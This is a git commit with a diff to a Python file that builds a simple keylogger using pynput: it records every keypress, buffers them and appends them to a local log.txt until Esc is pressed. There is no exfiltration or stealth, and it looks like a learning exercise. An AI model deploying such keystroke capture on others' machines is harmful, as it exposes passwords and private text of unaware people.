12f6d47fad4a4fb6dd00671f87307fe479fd2b24
Baruch Lavy <baruchlavy@gmail.com>
2025-06-16 01:33:47 +0300

    create listener functions

--- main.py
+++ main.py
@@ -2,14 +2,55 @@
 # f.write('\nbaruch lavy')
 # f.close()
 
-from pynput.keyboard import Listener
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
 
 def writeToFile(key):
     letter = str(key)
     letter = letter.replace("'","")
+
+    if letter == 'Key.space':
+        letter = ' '
+    elif letter == 'Key.shift_r':
+        letter = ''
+    elif letter == 'Key.backspace':
+        letter = ''
+    elif letter == 'Key.enter':
+        letter = '\n'
+    elif letter == 'Key.esc':
+        return False
     with open("log.txt",'a') as f:
         f.write(letter)
 
-with Listener(on_press=writeToFile) as listener:
+def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
+    print("{0} pressed", format(key))
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = [] 
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
+
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
     
